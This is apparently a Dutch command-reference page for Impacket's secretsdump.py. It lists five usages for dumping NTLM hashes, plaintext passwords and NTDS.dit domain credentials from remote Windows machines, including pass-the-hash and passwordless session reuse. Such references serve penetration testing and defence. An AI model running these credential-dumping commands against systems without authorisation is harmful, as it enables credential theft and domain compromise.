# secretsdump.py

NTLM-hashes, wachtwoorden in platte tekst en domeingegevens van Windows-systemen op afstand dumpen. Onderdeel van de Impacket-suite.

## Usage
- `secretsdump.py domein/gebruikersnaam:wachtwoord@doel` : dump referenties van een Windows-machine met een gebruikersnaam en wachtwoord
- `secretsdump.py -hashes LM_Hash:NT_Hash domein/gebruikersnaam@doel` : dump hashes van een machine met pass-the-hash authenticatie
- `secretsdump.py -just-dc domein/gebruikersnaam:wachtwoord@doel` : dump referenties van Active Directory's NTDS.dit bestand
- `secretsdump.py -sam pad/naar/SAM -system pad/naar/SYSTEM` : haal referenties uit een lokale SAM-database met behulp van registerhives
- `secretsdump.py -no-pass domein/gebruikersnaam@doel` : dump hashes van een machine zonder een wachtwoord op te geven (als er een geldige authenticatiesessie bestaat, bijv. via Kerberos of NTLM SSO)

## Links
- More information: https://github.com/fortra/impacket
